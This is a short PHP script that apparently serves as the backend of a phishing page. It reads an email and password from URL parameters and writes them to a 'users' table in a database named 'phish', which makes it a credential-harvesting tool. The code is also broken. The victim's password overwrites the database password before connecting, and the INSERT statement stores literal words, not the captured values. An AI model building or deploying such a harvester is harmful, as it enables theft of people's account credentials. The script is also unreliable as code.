<?php
$servername = "localhost:3306";
$username = "newuser";
$password = "password";
$dbname = "phish";

$email = $_GET["email"];
$password = $_GET["password"];

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO users (email, pass)
VALUES (email, password)";

if ($conn->query($sql) === TRUE) {
  echo "New record created successfully";
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
